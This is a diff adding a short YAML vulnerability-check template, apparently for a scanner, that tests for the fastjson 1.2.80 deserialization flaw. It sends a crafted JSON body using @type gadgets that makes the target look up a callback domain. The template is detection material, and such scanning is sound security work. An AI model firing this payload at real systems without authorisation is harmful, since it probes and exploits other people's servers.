@@ -1,0 +1,16 @@
+name: poc-yaml-fastjson1.2.80-dnslog
+set:
+  reverse: newReverse()
+  reverseURL: reverse.domain
+rules:
+  r0:
+    request:
+      method: POST
+      path: /
+      headers:
+        Content-Type: application/json
+      body: |
+        {"@type":"java.lang.Exception"，"@type":"com.alibaba.fastjson.JSONException","1wgw9i":{"@type":"java.net.InetSocketAddress"{"address":,"val":"{{reverseURL}}"}}}
+    expression: reverse.wait(5)
+expression: r0()
+
